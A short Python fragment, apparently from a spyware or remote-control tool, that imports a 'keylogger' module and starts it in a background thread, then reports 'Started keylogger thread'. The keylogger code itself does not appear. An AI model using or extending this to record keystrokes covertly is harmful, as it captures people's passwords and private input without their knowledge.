import threading
import keylogger

def handle_keylogger():
    t = threading.Thread(target=keylogger.main)
    t.start()
    return "Started keylogger thread"
